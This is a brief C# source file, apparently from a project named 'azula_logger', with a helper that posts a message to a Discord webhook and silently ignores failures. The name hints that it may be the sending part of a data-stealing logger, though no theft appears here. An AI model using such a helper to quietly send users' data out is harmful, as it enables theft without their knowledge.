using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace azula_logger
{
    class websend
    {
        public static void sendDiscordWebhook(string URL, string username, string message, string profilepic)
        {
            try
            {
            //making webclient
            using (WebClient web = new WebClient())
            {
                //shit for the webhook (if u can read u know what this is)
                NameValueCollection discordValues = new NameValueCollection();
                discordValues.Add("username", username);
                discordValues.Add("avatar_url", profilepic);
                discordValues.Add("content", message);
                web.UploadValues(URL, discordValues);
            }
            }
            catch { }
        }
    }
}
